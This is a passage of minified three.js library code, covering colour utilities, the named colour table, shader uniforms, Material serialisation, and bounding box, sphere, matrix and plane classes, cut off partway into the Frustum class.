255*this.r<<16^255*this.g<<8^255*this.b<<0},getHexString:function(){return(\"000000\"+this.getHex().toString(16)).slice(-6)},getHSL:function(a){a=a||{h:0,s:0,l:0};var b=this.r,c=this.g,d=this.b,e=Math.max(b,c,d),f=Math.min(b,c,d),g,h=(f+e)/2;if(f===e)f=g=0;else{var m=e-f,f=.5>=h?m/(e+f):\nm/(2-e-f);switch(e){case b:g=(c-d)/m+(c<d?6:0);break;case c:g=(d-b)/m+2;break;case d:g=(b-c)/m+4}g/=6}a.h=g;a.s=f;a.l=h;return a},getStyle:function(){return\"rgb(\"+(255*this.r|0)+\",\"+(255*this.g|0)+\",\"+(255*this.b|0)+\")\"},offsetHSL:function(a,b,c){var d=this.getHSL();d.h+=a;d.s+=b;d.l+=c;this.setHSL(d.h,d.s,d.l);return this},add:function(a){this.r+=a.r;this.g+=a.g;this.b+=a.b;return this},addColors:function(a,b){this.r=a.r+b.r;this.g=a.g+b.g;this.b=a.b+b.b;return this},addScalar:function(a){this.r+=\na;this.g+=a;this.b+=a;return this},sub:function(a){this.r=Math.max(0,this.r-a.r);this.g=Math.max(0,this.g-a.g);this.b=Math.max(0,this.b-a.b);return this},multiply:function(a){this.r*=a.r;this.g*=a.g;this.b*=a.b;return this},multiplyScalar:function(a){this.r*=a;this.g*=a;this.b*=a;return this},lerp:function(a,b){this.r+=(a.r-this.r)*b;this.g+=(a.g-this.g)*b;this.b+=(a.b-this.b)*b;return this},equals:function(a){return a.r===this.r&&a.g===this.g&&a.b===this.b},fromArray:function(a,b){void 0===b&&(b=\n0);this.r=a[b];this.g=a[b+1];this.b=a[b+2];return this},toArray:function(a,b){void 0===a&&(a=[]);void 0===b&&(b=0);a[b]=this.r;a[b+1]=this.g;a[b+2]=this.b;return a},toJSON:function(){return this.getHex()}};var Wf={aliceblue:15792383,antiquewhite:16444375,aqua:65535,aquamarine:8388564,azure:15794175,beige:16119260,bisque:16770244,black:0,blanchedalmond:16772045,blue:255,blueviolet:9055202,brown:10824234,burlywood:14596231,cadetblue:6266528,chartreuse:8388352,chocolate:13789470,coral:16744272,cornflowerblue:6591981,\ncornsilk:16775388,crimson:14423100,cyan:65535,darkblue:139,darkcyan:35723,darkgoldenrod:12092939,darkgray:11119017,darkgreen:25600,darkgrey:11119017,darkkhaki:12433259,darkmagenta:9109643,darkolivegreen:5597999,darkorange:16747520,darkorchid:10040012,darkred:9109504,darksalmon:15308410,darkseagreen:9419919,darkslateblue:4734347,darkslategray:3100495,darkslategrey:3100495,darkturquoise:52945,darkviolet:9699539,deeppink:16716947,deepskyblue:49151,dimgray:6908265,dimgrey:6908265,dodgerblue:2003199,firebrick:11674146,\nfloralwhite:16775920,forestgreen:2263842,fuchsia:16711935,gainsboro:14474460,ghostwhite:16316671,gold:16766720,goldenrod:14329120,gray:8421504,green:32768,greenyellow:11403055,grey:8421504,honeydew:15794160,hotpink:16738740,indianred:13458524,indigo:4915330,ivory:16777200,khaki:15787660,lavender:15132410,lavenderblush:16773365,lawngreen:8190976,lemonchiffon:16775885,lightblue:11393254,lightcoral:15761536,lightcyan:14745599,lightgoldenrodyellow:16448210,lightgray:13882323,lightgreen:9498256,lightgrey:13882323,\nlightpink:16758465,lightsalmon:16752762,lightseagreen:2142890,lightskyblue:8900346,lightslategray:7833753,lightslategrey:7833753,lightsteelblue:11584734,lightyellow:16777184,lime:65280,limegreen:3329330,linen:16445670,magenta:16711935,maroon:8388608,mediumaquamarine:6737322,mediumblue:205,mediumorchid:12211667,mediumpurple:9662683,mediumseagreen:3978097,mediumslateblue:8087790,mediumspringgreen:64154,mediumturquoise:4772300,mediumvioletred:13047173,midnightblue:1644912,mintcream:16121850,mistyrose:16770273,\nmoccasin:16770229,navajowhite:16768685,navy:128,oldlace:16643558,olive:8421376,olivedrab:7048739,orange:16753920,orangered:16729344,orchid:14315734,palegoldenrod:15657130,palegreen:10025880,paleturquoise:11529966,palevioletred:14381203,papayawhip:16773077,peachpuff:16767673,peru:13468991,pink:16761035,plum:14524637,powderblue:11591910,purple:8388736,red:16711680,rosybrown:12357519,royalblue:4286945,saddlebrown:9127187,salmon:16416882,sandybrown:16032864,seagreen:3050327,seashell:16774638,sienna:10506797,\nsilver:12632256,skyblue:8900331,slateblue:6970061,slategray:7372944,slategrey:7372944,snow:16775930,springgreen:65407,steelblue:4620980,tan:13808780,teal:32896,thistle:14204888,tomato:16737095,turquoise:4251856,violet:15631086,wheat:16113331,white:16777215,whitesmoke:16119285,yellow:16776960,yellowgreen:10145074};eb.prototype=Object.create(ea.prototype);eb.prototype.constructor=eb;eb.prototype.isDataTexture=!0;var V={common:{diffuse:{value:new J(15658734)},opacity:{value:1},map:{value:null},offsetRepeat:{value:new fa(0,\n0,1,1)},specularMap:{value:null},alphaMap:{value:null},envMap:{value:null},flipEnvMap:{value:-1},reflectivity:{value:1},refractionRatio:{value:.98}},aomap:{aoMap:{value:null},aoMapIntensity:{value:1}},lightmap:{lightMap:{value:null},lightMapIntensity:{value:1}},emissivemap:{emissiveMap:{value:null}},bumpmap:{bumpMap:{value:null},bumpScale:{value:1}},normalmap:{normalMap:{value:null},normalScale:{value:new D(1,1)}},displacementmap:{displacementMap:{value:null},displacementScale:{value:1},displacementBias:{value:0}},\nroughnessmap:{roughnessMap:{value:null}},metalnessmap:{metalnessMap:{value:null}},gradientmap:{gradientMap:{value:null}},fog:{fogDensity:{value:2.5E-4},fogNear:{value:1},fogFar:{value:2E3},fogColor:{value:new J(16777215)}},lights:{ambientLightColor:{value:[]},directionalLights:{value:[],properties:{direction:{},color:{},shadow:{},shadowBias:{},shadowRadius:{},shadowMapSize:{}}},directionalShadowMap:{value:[]},directionalShadowMatrix:{value:[]},spotLights:{value:[],properties:{color:{},position:{},\ndirection:{},distance:{},coneCos:{},penumbraCos:{},decay:{},shadow:{},shadowBias:{},shadowRadius:{},shadowMapSize:{}}},spotShadowMap:{value:[]},spotShadowMatrix:{value:[]},pointLights:{value:[],properties:{color:{},position:{},decay:{},distance:{},shadow:{},shadowBias:{},shadowRadius:{},shadowMapSize:{}}},pointShadowMap:{value:[]},pointShadowMatrix:{value:[]},hemisphereLights:{value:[],properties:{direction:{},skyColor:{},groundColor:{}}},rectAreaLights:{value:[],properties:{color:{},position:{},\nwidth:{},height:{}}}},points:{diffuse:{value:new J(15658734)},opacity:{value:1},size:{value:1},scale:{value:1},map:{value:null},offsetRepeat:{value:new fa(0,0,1,1)}}},bb={basic:{uniforms:Ja.merge([V.common,V.aomap,V.lightmap,V.fog]),vertexShader:Z.meshbasic_vert,fragmentShader:Z.meshbasic_frag},lambert:{uniforms:Ja.merge([V.common,V.aomap,V.lightmap,V.emissivemap,V.fog,V.lights,{emissive:{value:new J(0)}}]),vertexShader:Z.meshlambert_vert,fragmentShader:Z.meshlambert_frag},phong:{uniforms:Ja.merge([V.common,\nV.aomap,V.lightmap,V.emissivemap,V.bumpmap,V.normalmap,V.displacementmap,V.gradientmap,V.fog,V.lights,{emissive:{value:new J(0)},specular:{value:new J(1118481)},shininess:{value:30}}]),vertexShader:Z.meshphong_vert,fragmentShader:Z.meshphong_frag},standard:{uniforms:Ja.merge([V.common,V.aomap,V.lightmap,V.emissivemap,V.bumpmap,V.normalmap,V.displacementmap,V.roughnessmap,V.metalnessmap,V.fog,V.lights,{emissive:{value:new J(0)},roughness:{value:.5},metalness:{value:0},envMapIntensity:{value:1}}]),\nvertexShader:Z.meshphysical_vert,fragmentShader:Z.meshphysical_frag},points:{uniforms:Ja.merge([V.points,V.fog]),vertexShader:Z.points_vert,fragmentShader:Z.points_frag},dashed:{uniforms:Ja.merge([V.common,V.fog,{scale:{value:1},dashSize:{value:1},totalSize:{value:2}}]),vertexShader:Z.linedashed_vert,fragmentShader:Z.linedashed_frag},depth:{uniforms:Ja.merge([V.common,V.displacementmap]),vertexShader:Z.depth_vert,fragmentShader:Z.depth_frag},normal:{uniforms:Ja.merge([V.common,V.bumpmap,V.normalmap,\nV.displacementmap,{opacity:{value:1}}]),vertexShader:Z.normal_vert,fragmentShader:Z.normal_frag},cube:{uniforms:{tCube:{value:null},tFlip:{value:-1},opacity:{value:1}},vertexShader:Z.cube_vert,fragmentShader:Z.cube_frag},equirect:{uniforms:{tEquirect:{value:null},tFlip:{value:-1}},vertexShader:Z.equirect_vert,fragmentShader:Z.equirect_frag},distanceRGBA:{uniforms:{lightPos:{value:new q}},vertexShader:Z.distanceRGBA_vert,fragmentShader:Z.distanceRGBA_frag}};bb.physical={uniforms:Ja.merge([bb.standard.uniforms,\n{clearCoat:{value:0},clearCoatRoughness:{value:0}}]),vertexShader:Z.meshphysical_vert,fragmentShader:Z.meshphysical_frag};sc.prototype={constructor:sc,set:function(a,b){this.min.copy(a);this.max.copy(b);return this},setFromPoints:function(a){this.makeEmpty();for(var b=0,c=a.length;b<c;b++)this.expandByPoint(a[b]);return this},setFromCenterAndSize:function(){var a=new D;return function(b,c){var d=a.copy(c).multiplyScalar(.5);this.min.copy(b).sub(d);this.max.copy(b).add(d);return this}}(),clone:function(){return(new this.constructor).copy(this)},\ncopy:function(a){this.min.copy(a.min);this.max.copy(a.max);return this},makeEmpty:function(){this.min.x=this.min.y=Infinity;this.max.x=this.max.y=-Infinity;return this},isEmpty:function(){return this.max.x<this.min.x||this.max.y<this.min.y},getCenter:function(a){a=a||new D;return this.isEmpty()?a.set(0,0):a.addVectors(this.min,this.max).multiplyScalar(.5)},getSize:function(a){a=a||new D;return this.isEmpty()?a.set(0,0):a.subVectors(this.max,this.min)},expandByPoint:function(a){this.min.min(a);this.max.max(a);\nreturn this},expandByVector:function(a){this.min.sub(a);this.max.add(a);return this},expandByScalar:function(a){this.min.addScalar(-a);this.max.addScalar(a);return this},containsPoint:function(a){return a.x<this.min.x||a.x>this.max.x||a.y<this.min.y||a.y>this.max.y?!1:!0},containsBox:function(a){return this.min.x<=a.min.x&&a.max.x<=this.max.x&&this.min.y<=a.min.y&&a.max.y<=this.max.y},getParameter:function(a,b){return(b||new D).set((a.x-this.min.x)/(this.max.x-this.min.x),(a.y-this.min.y)/(this.max.y-\nthis.min.y))},intersectsBox:function(a){return a.max.x<this.min.x||a.min.x>this.max.x||a.max.y<this.min.y||a.min.y>this.max.y?!1:!0},clampPoint:function(a,b){return(b||new D).copy(a).clamp(this.min,this.max)},distanceToPoint:function(){var a=new D;return function(b){return a.copy(b).clamp(this.min,this.max).sub(b).length()}}(),intersect:function(a){this.min.max(a.min);this.max.min(a.max);return this},union:function(a){this.min.min(a.min);this.max.max(a.max);return this},translate:function(a){this.min.add(a);\nthis.max.add(a);return this},equals:function(a){return a.min.equals(this.min)&&a.max.equals(this.max)}};var Af=0;X.prototype={constructor:X,isMaterial:!0,get needsUpdate(){return this._needsUpdate},set needsUpdate(a){!0===a&&this.update();this._needsUpdate=a},setValues:function(a){if(void 0!==a)for(var b in a){var c=a[b];if(void 0===c)console.warn(\"THREE.Material: '\"+b+\"' parameter is undefined.\");else{var d=this[b];void 0===d?console.warn(\"THREE.\"+this.type+\": '\"+b+\"' is not a property of this material.\"):\nd&&d.isColor?d.set(c):d&&d.isVector3&&c&&c.isVector3?d.copy(c):this[b]=\"overdraw\"===b?Number(c):c}}},toJSON:function(a){function b(a){var b=[],c;for(c in a){var d=a[c];delete d.metadata;b.push(d)}return b}var c=void 0===a;c&&(a={textures:{},images:{}});var d={metadata:{version:4.4,type:\"Material\",generator:\"Material.toJSON\"}};d.uuid=this.uuid;d.type=this.type;\"\"!==this.name&&(d.name=this.name);this.color&&this.color.isColor&&(d.color=this.color.getHex());void 0!==this.roughness&&(d.roughness=this.roughness);\nvoid 0!==this.metalness&&(d.metalness=this.metalness);this.emissive&&this.emissive.isColor&&(d.emissive=this.emissive.getHex());this.specular&&this.specular.isColor&&(d.specular=this.specular.getHex());void 0!==this.shininess&&(d.shininess=this.shininess);void 0!==this.clearCoat&&(d.clearCoat=this.clearCoat);void 0!==this.clearCoatRoughness&&(d.clearCoatRoughness=this.clearCoatRoughness);this.map&&this.map.isTexture&&(d.map=this.map.toJSON(a).uuid);this.alphaMap&&this.alphaMap.isTexture&&(d.alphaMap=\nthis.alphaMap.toJSON(a).uuid);this.lightMap&&this.lightMap.isTexture&&(d.lightMap=this.lightMap.toJSON(a).uuid);this.bumpMap&&this.bumpMap.isTexture&&(d.bumpMap=this.bumpMap.toJSON(a).uuid,d.bumpScale=this.bumpScale);this.normalMap&&this.normalMap.isTexture&&(d.normalMap=this.normalMap.toJSON(a).uuid,d.normalScale=this.normalScale.toArray());this.displacementMap&&this.displacementMap.isTexture&&(d.displacementMap=this.displacementMap.toJSON(a).uuid,d.displacementScale=this.displacementScale,d.displacementBias=\nthis.displacementBias);this.roughnessMap&&this.roughnessMap.isTexture&&(d.roughnessMap=this.roughnessMap.toJSON(a).uuid);this.metalnessMap&&this.metalnessMap.isTexture&&(d.metalnessMap=this.metalnessMap.toJSON(a).uuid);this.emissiveMap&&this.emissiveMap.isTexture&&(d.emissiveMap=this.emissiveMap.toJSON(a).uuid);this.specularMap&&this.specularMap.isTexture&&(d.specularMap=this.specularMap.toJSON(a).uuid);this.envMap&&this.envMap.isTexture&&(d.envMap=this.envMap.toJSON(a).uuid,d.reflectivity=this.reflectivity);\nthis.gradientMap&&this.gradientMap.isTexture&&(d.gradientMap=this.gradientMap.toJSON(a).uuid);void 0!==this.size&&(d.size=this.size);void 0!==this.sizeAttenuation&&(d.sizeAttenuation=this.sizeAttenuation);1!==this.blending&&(d.blending=this.blending);2!==this.shading&&(d.shading=this.shading);0!==this.side&&(d.side=this.side);0!==this.vertexColors&&(d.vertexColors=this.vertexColors);1>this.opacity&&(d.opacity=this.opacity);!0===this.transparent&&(d.transparent=this.transparent);d.depthFunc=this.depthFunc;\nd.depthTest=this.depthTest;d.depthWrite=this.depthWrite;0<this.alphaTest&&(d.alphaTest=this.alphaTest);!0===this.premultipliedAlpha&&(d.premultipliedAlpha=this.premultipliedAlpha);!0===this.wireframe&&(d.wireframe=this.wireframe);1<this.wireframeLinewidth&&(d.wireframeLinewidth=this.wireframeLinewidth);\"round\"!==this.wireframeLinecap&&(d.wireframeLinecap=this.wireframeLinecap);\"round\"!==this.wireframeLinejoin&&(d.wireframeLinejoin=this.wireframeLinejoin);d.skinning=this.skinning;d.morphTargets=this.morphTargets;\nc&&(c=b(a.textures),a=b(a.images),0<c.length&&(d.textures=c),0<a.length&&(d.images=a));return d},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.name=a.name;this.fog=a.fog;this.lights=a.lights;this.blending=a.blending;this.side=a.side;this.shading=a.shading;this.vertexColors=a.vertexColors;this.opacity=a.opacity;this.transparent=a.transparent;this.blendSrc=a.blendSrc;this.blendDst=a.blendDst;this.blendEquation=a.blendEquation;this.blendSrcAlpha=a.blendSrcAlpha;this.blendDstAlpha=\na.blendDstAlpha;this.blendEquationAlpha=a.blendEquationAlpha;this.depthFunc=a.depthFunc;this.depthTest=a.depthTest;this.depthWrite=a.depthWrite;this.colorWrite=a.colorWrite;this.precision=a.precision;this.polygonOffset=a.polygonOffset;this.polygonOffsetFactor=a.polygonOffsetFactor;this.polygonOffsetUnits=a.polygonOffsetUnits;this.alphaTest=a.alphaTest;this.premultipliedAlpha=a.premultipliedAlpha;this.overdraw=a.overdraw;this.visible=a.visible;this.clipShadows=a.clipShadows;this.clipIntersection=a.clipIntersection;\na=a.clippingPlanes;var b=null;if(null!==a)for(var c=a.length,b=Array(c),d=0;d!==c;++d)b[d]=a[d].clone();this.clippingPlanes=b;return this},update:function(){this.dispatchEvent({type:\"update\"})},dispose:function(){this.dispatchEvent({type:\"dispose\"})}};Object.assign(X.prototype,pa.prototype);Ha.prototype=Object.create(X.prototype);Ha.prototype.constructor=Ha;Ha.prototype.isShaderMaterial=!0;Ha.prototype.copy=function(a){X.prototype.copy.call(this,a);this.fragmentShader=a.fragmentShader;this.vertexShader=\na.vertexShader;this.uniforms=Ja.clone(a.uniforms);this.defines=a.defines;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;this.lights=a.lights;this.clipping=a.clipping;this.skinning=a.skinning;this.morphTargets=a.morphTargets;this.morphNormals=a.morphNormals;this.extensions=a.extensions;return this};Ha.prototype.toJSON=function(a){a=X.prototype.toJSON.call(this,a);a.uniforms=this.uniforms;a.vertexShader=this.vertexShader;a.fragmentShader=this.fragmentShader;return a};ab.prototype=\nObject.create(X.prototype);ab.prototype.constructor=ab;ab.prototype.isMeshDepthMaterial=!0;ab.prototype.copy=function(a){X.prototype.copy.call(this,a);this.depthPacking=a.depthPacking;this.skinning=a.skinning;this.morphTargets=a.morphTargets;this.map=a.map;this.alphaMap=a.alphaMap;this.displacementMap=a.displacementMap;this.displacementScale=a.displacementScale;this.displacementBias=a.displacementBias;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;return this};Pa.prototype=\n{constructor:Pa,isBox3:!0,set:function(a,b){this.min.copy(a);this.max.copy(b);return this},setFromArray:function(a){for(var b=Infinity,c=Infinity,d=Infinity,e=-Infinity,f=-Infinity,g=-Infinity,h=0,m=a.length;h<m;h+=3){var k=a[h],l=a[h+1],p=a[h+2];k<b&&(b=k);l<c&&(c=l);p<d&&(d=p);k>e&&(e=k);l>f&&(f=l);p>g&&(g=p)}this.min.set(b,c,d);this.max.set(e,f,g);return this},setFromBufferAttribute:function(a){for(var b=Infinity,c=Infinity,d=Infinity,e=-Infinity,f=-Infinity,g=-Infinity,h=0,m=a.count;h<m;h++){var k=\na.getX(h),l=a.getY(h),p=a.getZ(h);k<b&&(b=k);l<c&&(c=l);p<d&&(d=p);k>e&&(e=k);l>f&&(f=l);p>g&&(g=p)}this.min.set(b,c,d);this.max.set(e,f,g);return this},setFromPoints:function(a){this.makeEmpty();for(var b=0,c=a.length;b<c;b++)this.expandByPoint(a[b]);return this},setFromCenterAndSize:function(){var a=new q;return function(b,c){var d=a.copy(c).multiplyScalar(.5);this.min.copy(b).sub(d);this.max.copy(b).add(d);return this}}(),setFromObject:function(a){this.makeEmpty();return this.expandByObject(a)},\nclone:function(){return(new this.constructor).copy(this)},copy:function(a){this.min.copy(a.min);this.max.copy(a.max);return this},makeEmpty:function(){this.min.x=this.min.y=this.min.z=Infinity;this.max.x=this.max.y=this.max.z=-Infinity;return this},isEmpty:function(){return this.max.x<this.min.x||this.max.y<this.min.y||this.max.z<this.min.z},getCenter:function(a){a=a||new q;return this.isEmpty()?a.set(0,0,0):a.addVectors(this.min,this.max).multiplyScalar(.5)},getSize:function(a){a=a||new q;return this.isEmpty()?\na.set(0,0,0):a.subVectors(this.max,this.min)},expandByPoint:function(a){this.min.min(a);this.max.max(a);return this},expandByVector:function(a){this.min.sub(a);this.max.add(a);return this},expandByScalar:function(a){this.min.addScalar(-a);this.max.addScalar(a);return this},expandByObject:function(){var a=new q;return function(b){var c=this;b.updateMatrixWorld(!0);b.traverse(function(b){var e,f;e=b.geometry;if(void 0!==e)if(e.isGeometry){var g=e.vertices;e=0;for(f=g.length;e<f;e++)a.copy(g[e]),a.applyMatrix4(b.matrixWorld),\nc.expandByPoint(a)}else if(e.isBufferGeometry&&(g=e.attributes.position,void 0!==g))for(e=0,f=g.count;e<f;e++)a.fromBufferAttribute(g,e).applyMatrix4(b.matrixWorld),c.expandByPoint(a)});return this}}(),containsPoint:function(a){return a.x<this.min.x||a.x>this.max.x||a.y<this.min.y||a.y>this.max.y||a.z<this.min.z||a.z>this.max.z?!1:!0},containsBox:function(a){return this.min.x<=a.min.x&&a.max.x<=this.max.x&&this.min.y<=a.min.y&&a.max.y<=this.max.y&&this.min.z<=a.min.z&&a.max.z<=this.max.z},getParameter:function(a,\nb){return(b||new q).set((a.x-this.min.x)/(this.max.x-this.min.x),(a.y-this.min.y)/(this.max.y-this.min.y),(a.z-this.min.z)/(this.max.z-this.min.z))},intersectsBox:function(a){return a.max.x<this.min.x||a.min.x>this.max.x||a.max.y<this.min.y||a.min.y>this.max.y||a.max.z<this.min.z||a.min.z>this.max.z?!1:!0},intersectsSphere:function(){var a;return function(b){void 0===a&&(a=new q);this.clampPoint(b.center,a);return a.distanceToSquared(b.center)<=b.radius*b.radius}}(),intersectsPlane:function(a){var b,\nc;0<a.normal.x?(b=a.normal.x*this.min.x,c=a.normal.x*this.max.x):(b=a.normal.x*this.max.x,c=a.normal.x*this.min.x);0<a.normal.y?(b+=a.normal.y*this.min.y,c+=a.normal.y*this.max.y):(b+=a.normal.y*this.max.y,c+=a.normal.y*this.min.y);0<a.normal.z?(b+=a.normal.z*this.min.z,c+=a.normal.z*this.max.z):(b+=a.normal.z*this.max.z,c+=a.normal.z*this.min.z);return b<=a.constant&&c>=a.constant},clampPoint:function(a,b){return(b||new q).copy(a).clamp(this.min,this.max)},distanceToPoint:function(){var a=new q;\nreturn function(b){return a.copy(b).clamp(this.min,this.max).sub(b).length()}}(),getBoundingSphere:function(){var a=new q;return function(b){b=b||new Na;this.getCenter(b.center);b.radius=.5*this.getSize(a).length();return b}}(),intersect:function(a){this.min.max(a.min);this.max.min(a.max);this.isEmpty()&&this.makeEmpty();return this},union:function(a){this.min.min(a.min);this.max.max(a.max);return this},applyMatrix4:function(){var a=[new q,new q,new q,new q,new q,new q,new q,new q];return function(b){if(this.isEmpty())return this;\na[0].set(this.min.x,this.min.y,this.min.z).applyMatrix4(b);a[1].set(this.min.x,this.min.y,this.max.z).applyMatrix4(b);a[2].set(this.min.x,this.max.y,this.min.z).applyMatrix4(b);a[3].set(this.min.x,this.max.y,this.max.z).applyMatrix4(b);a[4].set(this.max.x,this.min.y,this.min.z).applyMatrix4(b);a[5].set(this.max.x,this.min.y,this.max.z).applyMatrix4(b);a[6].set(this.max.x,this.max.y,this.min.z).applyMatrix4(b);a[7].set(this.max.x,this.max.y,this.max.z).applyMatrix4(b);this.setFromPoints(a);return this}}(),\ntranslate:function(a){this.min.add(a);this.max.add(a);return this},equals:function(a){return a.min.equals(this.min)&&a.max.equals(this.max)}};Na.prototype={constructor:Na,set:function(a,b){this.center.copy(a);this.radius=b;return this},setFromPoints:function(){var a;return function(b,c){void 0===a&&(a=new Pa);var d=this.center;void 0!==c?d.copy(c):a.setFromPoints(b).getCenter(d);for(var e=0,f=0,g=b.length;f<g;f++)e=Math.max(e,d.distanceToSquared(b[f]));this.radius=Math.sqrt(e);return this}}(),clone:function(){return(new this.constructor).copy(this)},\ncopy:function(a){this.center.copy(a.center);this.radius=a.radius;return this},empty:function(){return 0>=this.radius},containsPoint:function(a){return a.distanceToSquared(this.center)<=this.radius*this.radius},distanceToPoint:function(a){return a.distanceTo(this.center)-this.radius},intersectsSphere:function(a){var b=this.radius+a.radius;return a.center.distanceToSquared(this.center)<=b*b},intersectsBox:function(a){return a.intersectsSphere(this)},intersectsPlane:function(a){return Math.abs(this.center.dot(a.normal)-\na.constant)<=this.radius},clampPoint:function(a,b){var c=this.center.distanceToSquared(a),d=b||new q;d.copy(a);c>this.radius*this.radius&&(d.sub(this.center).normalize(),d.multiplyScalar(this.radius).add(this.center));return d},getBoundingBox:function(a){a=a||new Pa;a.set(this.center,this.center);a.expandByScalar(this.radius);return a},applyMatrix4:function(a){this.center.applyMatrix4(a);this.radius*=a.getMaxScaleOnAxis();return this},translate:function(a){this.center.add(a);return this},equals:function(a){return a.center.equals(this.center)&&\na.radius===this.radius}};ya.prototype={constructor:ya,isMatrix3:!0,set:function(a,b,c,d,e,f,g,h,m){var k=this.elements;k[0]=a;k[1]=d;k[2]=g;k[3]=b;k[4]=e;k[5]=h;k[6]=c;k[7]=f;k[8]=m;return this},identity:function(){this.set(1,0,0,0,1,0,0,0,1);return this},clone:function(){return(new this.constructor).fromArray(this.elements)},copy:function(a){a=a.elements;this.set(a[0],a[3],a[6],a[1],a[4],a[7],a[2],a[5],a[8]);return this},setFromMatrix4:function(a){a=a.elements;this.set(a[0],a[4],a[8],a[1],a[5],a[9],\na[2],a[6],a[10]);return this},applyToBufferAttribute:function(){var a;return function(b){void 0===a&&(a=new q);for(var c=0,d=b.count;c<d;c++)a.x=b.getX(c),a.y=b.getY(c),a.z=b.getZ(c),a.applyMatrix3(this),b.setXYZ(c,a.x,a.y,a.z);return b}}(),multiplyScalar:function(a){var b=this.elements;b[0]*=a;b[3]*=a;b[6]*=a;b[1]*=a;b[4]*=a;b[7]*=a;b[2]*=a;b[5]*=a;b[8]*=a;return this},determinant:function(){var a=this.elements,b=a[0],c=a[1],d=a[2],e=a[3],f=a[4],g=a[5],h=a[6],m=a[7],a=a[8];return b*f*a-b*g*m-c*e*\na+c*g*h+d*e*m-d*f*h},getInverse:function(a,b){a&&a.isMatrix4&&console.error(\"THREE.Matrix3.getInverse no longer takes a Matrix4 argument.\");var c=a.elements,d=this.elements,e=c[0],f=c[1],g=c[2],h=c[3],m=c[4],k=c[5],l=c[6],p=c[7],c=c[8],n=c*m-k*p,u=k*l-c*h,q=p*h-m*l,r=e*n+f*u+g*q;if(0===r){if(!0===b)throw Error(\"THREE.Matrix3.getInverse(): can't invert matrix, determinant is 0\");console.warn(\"THREE.Matrix3.getInverse(): can't invert matrix, determinant is 0\");return this.identity()}r=1/r;d[0]=n*r;\nd[1]=(g*p-c*f)*r;d[2]=(k*f-g*m)*r;d[3]=u*r;d[4]=(c*e-g*l)*r;d[5]=(g*h-k*e)*r;d[6]=q*r;d[7]=(f*l-p*e)*r;d[8]=(m*e-f*h)*r;return this},transpose:function(){var a,b=this.elements;a=b[1];b[1]=b[3];b[3]=a;a=b[2];b[2]=b[6];b[6]=a;a=b[5];b[5]=b[7];b[7]=a;return this},getNormalMatrix:function(a){return this.setFromMatrix4(a).getInverse(this).transpose()},transposeIntoArray:function(a){var b=this.elements;a[0]=b[0];a[1]=b[3];a[2]=b[6];a[3]=b[1];a[4]=b[4];a[5]=b[7];a[6]=b[2];a[7]=b[5];a[8]=b[8];return this},\nfromArray:function(a,b){void 0===b&&(b=0);for(var c=0;9>c;c++)this.elements[c]=a[c+b];return this},toArray:function(a,b){void 0===a&&(a=[]);void 0===b&&(b=0);var c=this.elements;a[b]=c[0];a[b+1]=c[1];a[b+2]=c[2];a[b+3]=c[3];a[b+4]=c[4];a[b+5]=c[5];a[b+6]=c[6];a[b+7]=c[7];a[b+8]=c[8];return a}};la.prototype={constructor:la,set:function(a,b){this.normal.copy(a);this.constant=b;return this},setComponents:function(a,b,c,d){this.normal.set(a,b,c);this.constant=d;return this},setFromNormalAndCoplanarPoint:function(a,\nb){this.normal.copy(a);this.constant=-b.dot(this.normal);return this},setFromCoplanarPoints:function(){var a=new q,b=new q;return function(c,d,e){d=a.subVectors(e,d).cross(b.subVectors(c,d)).normalize();this.setFromNormalAndCoplanarPoint(d,c);return this}}(),clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.normal.copy(a.normal);this.constant=a.constant;return this},normalize:function(){var a=1/this.normal.length();this.normal.multiplyScalar(a);this.constant*=a;return this},\nnegate:function(){this.constant*=-1;this.normal.negate();return this},distanceToPoint:function(a){return this.normal.dot(a)+this.constant},distanceToSphere:function(a){return this.distanceToPoint(a.center)-a.radius},projectPoint:function(a,b){return this.orthoPoint(a,b).sub(a).negate()},orthoPoint:function(a,b){var c=this.distanceToPoint(a);return(b||new q).copy(this.normal).multiplyScalar(c)},intersectLine:function(){var a=new q;return function(b,c){var d=c||new q,e=b.delta(a),f=this.normal.dot(e);\nif(0===f){if(0===this.distanceToPoint(b.start))return d.copy(b.start)}else return f=-(b.start.dot(this.normal)+this.constant)/f,0>f||1<f?void 0:d.copy(e).multiplyScalar(f).add(b.start)}}(),intersectsLine:function(a){var b=this.distanceToPoint(a.start);a=this.distanceToPoint(a.end);return 0>b&&0<a||0>a&&0<b},intersectsBox:function(a){return a.intersectsPlane(this)},intersectsSphere:function(a){return a.intersectsPlane(this)},coplanarPoint:function(a){return(a||new q).copy(this.normal).multiplyScalar(-this.constant)},\napplyMatrix4:function(){var a=new q,b=new ya;return function(c,d){var e=this.coplanarPoint(a).applyMatrix4(c),f=d||b.getNormalMatrix(c),f=this.normal.applyMatrix3(f).normalize();this.constant=-e.dot(f);return this}}(),translate:function(a){this.constant-=a.dot(this.normal);return this},equals:function(a){return a.normal.equals(this.normal)&&a.constant===this.constant}};tc.prototype={constructor:tc,set:function(a,b,c,d,e,f){var g=this.planes;g[0].copy(a);g[1].copy(b);g[2].copy(c);g[3].copy(d);g[4].copy(e);\ng[5].copy(f);return this},clone:function(){return(new this.constructor).copy(this)},copy:function(a){for(var b=this.planes,c=0;6>c;c++)b[c].copy(a.planes[c]);return this},setFromMatrix:function(a){var b=this.planes,c=a.elements;a=c[0];var d=c[1],e=c[2],f=c[3],g=c[4],h=c[5],m=c[6],k=c[7],l=c[8],p=c[9],n=c[10],u=c[11],q=c[12],r=c[13],A=c[14],c=c[15];b[0].setComponents(f-a,k-g,u-l,c-q).normalize();b[1].setComponents(f+a,k+g,u+l,c+q).normalize();b[2].setComponents(f+d,k+h,u+p,c+r).normalize();b[3].setComponents(f-\nd,k-h,u-p,c-r).normalize();b[4].setComponents(f-e,k-m,u-n,c-A).normalize();b[5].setComponents(f+e,k+m,u+n,c+A).normalize();return this},intersectsObject:function(){var a=new Na;return function(b){var c=b.geometry;null===c.boundingSphere&&c.computeBoundingSphere();a.copy(c.boundingSphere).applyMatrix4(b.matrixWorld);return this.intersectsSphere(a)}}(),intersectsSprite:function(){var a=new Na;return function(b){a.center.set(0,0,0);a.radius=.7071067811865476;a.applyMatrix4(b.matrixWorld);return this.intersectsSphere(a)}}(),\nintersectsSphere:function(a){var b=this.planes,c=a.center;a=-a.radius;for(var d=0;6>d;d++)if(b[d].distanceToPoint(c)<a)return!1;return!0},intersectsBox:function(){var a=new q,b=new q;return 